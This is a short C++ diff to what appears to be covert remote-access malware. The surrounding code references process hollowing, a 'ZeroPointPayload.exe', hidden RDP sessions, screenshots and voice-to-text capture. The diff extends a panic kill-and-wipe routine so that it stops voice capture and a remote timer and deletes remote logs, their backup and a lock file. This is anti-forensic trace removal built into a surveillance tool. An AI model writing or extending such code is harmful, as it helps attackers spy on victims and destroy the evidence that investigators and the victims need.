@@ -133,6 +133,10 @@ bool PerformHollowing() {
 //  stops the VE, kills RDP sessions, and terminates the process immediately.
 
 [[noreturn]] void PanicKillAndWipe() {
+    // 0. Stop voice-to-text and inactivity timer immediately
+    StopVoiceToText();
+    StopRemoteInactivityTimer();
+
     // 1. Stop the Virtual Environment cleanly (disconnect RDP, destroy windows)
     StopVirtualEnvironment();
 
@@ -149,6 +153,9 @@ bool PerformHollowing() {
         DeleteFileA("C:\\ProgramData\\ZeroPoint\\ve_config.ini");
         DeleteFileA("C:\\ProgramData\\ZeroPoint\\ve_session.rdp");
         DeleteFileA("C:\\ProgramData\\ZeroPoint\\ZeroPointPayload.exe");
+        DeleteFileA("C:\\ProgramData\\ZeroPoint\\remote.log");
+        DeleteFileA("C:\\ProgramData\\ZeroPoint\\remote.log.bak");
+        DeleteFileA("C:\\ProgramData\\ZeroPoint\\remote_active.lock");
         RemoveDirectoryA("C:\\ProgramData\\ZeroPoint\\screenshots");
         RemoveDirectoryA(configDir);
     }
